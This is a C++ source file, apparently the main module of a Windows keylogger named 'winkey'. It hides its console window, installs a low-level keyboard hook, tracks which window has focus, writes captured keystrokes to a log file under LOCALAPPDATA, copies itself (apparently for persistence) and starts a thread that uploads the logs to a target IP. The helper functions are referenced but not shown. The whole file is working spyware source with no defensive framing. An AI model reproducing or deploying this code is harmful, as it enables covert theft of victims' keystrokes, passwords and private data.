#include "Keylogger.h"

winkey winkey_g;

void init_winkey()
{
    GetWindowTextA(GetForegroundWindow(), winkey_g.hwndFocusedWindow, 256);
    memset(winkey_g.hwndPrevFocusedWindow, 0, 256);
    winkey_g.nl = false;
    winkey_g.prevClipBoard = "";
    winkey_g.running = true;
    winkey_g.targetIP = getMyIp();
}

int main()
{
    init_winkey();
    char* envPath = nullptr;
    size_t len;
    _dupenv_s(&envPath, &len, "USER_LOCALAPPDATA");
    
    if (envPath == nullptr)
    {
        _dupenv_s(&envPath, &len, "LOCALAPPDATA");
        HWND currWindow = FindWindowA("ConsoleWindowClass", NULL);
        if (currWindow != NULL)
            ShowWindow(currWindow, false);
    }   
    if (envPath != nullptr)
    {
        winkey_g.localAppData = std::string(envPath);
        winkey_g.pathFile = winkey_g.localAppData + "\\logs.txt";
    }
    else
       return (1);

    std::replace(winkey_g.pathFile.begin(), winkey_g.pathFile.end(), '\\', '/');
    
    createFileCopy();
    if ((winkey_g.keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0)) == NULL)
        return (1);
 
    HWINEVENTHOOK hWinEventHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
    if (hWinEventHook == 0)
        return (1);

    std::thread UploadThread(threadUpload);
    SetTimer(NULL, 0, 1000, (TIMERPROC)TimerCallback);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    winkey_g.running = false;
    UploadThread.join();
    free(envPath);
    UnhookWindowsHookEx(winkey_g.keyboardHook);
    UnhookWinEvent(hWinEventHook);
    FreeConsole();
    return (0);
}





